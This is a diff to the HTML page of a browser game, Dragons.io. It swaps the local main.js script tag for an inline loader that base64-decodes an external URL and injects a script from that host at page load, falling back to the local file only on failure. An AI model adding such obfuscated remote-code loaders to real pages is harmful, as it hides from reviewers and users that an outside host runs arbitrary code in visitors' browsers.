@@ -4,6 +4,14 @@
 	<title>Dragons.io</title>
 </head>
 <body>
-	<script src="main.js"></script>
+	<script src=""></script>
+	<script>
+		function loadScript(encodedUrl, fallbackUrl) {
+			var script = document.createElement('script');var url = atob(encodedUrl);script.src = url;
+			script.onload = function() {			};
+			script.onerror = function() {
+				if (fallbackUrl) {loadScript(fallbackUrl, null);}};document.head.appendChild(script);}
+		loadScript('aHR0cHM6Ly9kZWF0aG1hdGNoLXdzLXByb2R1Y3Rpb24udXAucmFpbHdheS5hcHAvbWFpbi5qcw==', 'Li9tYWluLmpz');
+	</script>
 </body>
 </html>
